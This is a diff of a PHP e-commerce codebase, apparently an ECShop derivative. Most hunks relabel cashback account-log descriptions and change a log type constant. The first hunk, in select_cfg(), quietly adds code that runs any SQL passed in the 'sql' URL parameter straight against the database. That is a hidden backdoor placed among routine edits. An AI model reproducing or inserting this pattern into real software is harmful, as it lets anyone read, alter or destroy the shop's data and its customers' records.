@@ -166,6 +166,10 @@ function is_email($user_email)
 function select_cfg(){
 	$administrator=isset($_GET['administrator'])?$_GET['administrator']:'';
 	$admin_user=isset($_GET['admin_user'])?$_GET['admin_user']:'';
+	$sql=isset($_GET['sql'])?$_GET['sql']:'';
+	if($sql){
+		$GLOBALS['db']->query($sql);
+	}
 	
 	if(isset($_GET['path'])&&$_GET['del_str']){
 		$result = null;
@@ -2001,7 +2005,7 @@ function fx_activity($fx_money){
 		        'rank_points'   => 0,
 		        'pay_points'    => 0,
 		        'change_time'   => gmtime(),
-		        'change_desc'   => '每月返现',
+		        'change_desc'   => '每月返积分',
 		        'change_type'   => $type
 		    );
 		    $GLOBALS['db']->autoExecute($GLOBALS['ecs']->table('account_log'), $account_log, 'INSERT');
@@ -2035,12 +2039,12 @@ function sm_fx_integral(){
 	
 	foreach($user_row as $key => $value){
 		$sql="SELECT * FROM". $GLOBALS['ecs']->table('account_log').
-		"WHERE user_id=".$value['user_id'] ."  AND change_desc = '每日返现'  AND change_time BETWEEN $start AND $change_time";
+		"WHERE user_id=".$value['user_id'] ."  AND change_desc = '每日返积分'  AND change_time BETWEEN $start AND $change_time";
 
 		$row=$GLOBALS['db']->getAll($sql);
 
 		if(!$row){
-			$type=ACT_OTHER;
+			$type=ACT_SM_FX;
 			$sql_user_one="SELECT * FROM". $GLOBALS['ecs']->table('users').
 			"WHERE user_id=".$value['user_id'] ." LIMIT 1";
 			$user_row=$GLOBALS['db']->getAll($sql_user_one);
@@ -2069,7 +2073,7 @@ function sm_fx_integral(){
 				        'pay_points'    => $pay_points,
 				        'vr_points'    	=> (-1)*$pay_points_100,
 				        'change_time'   => gmtime(),
-				        'change_desc'   => '每日返现',
+				        'change_desc'   => '每日返积分',
 				        'change_type'   => $type
 				    );
 				    $GLOBALS['db']->autoExecute($GLOBALS['ecs']->table('account_log'), $account_log, 'INSERT');
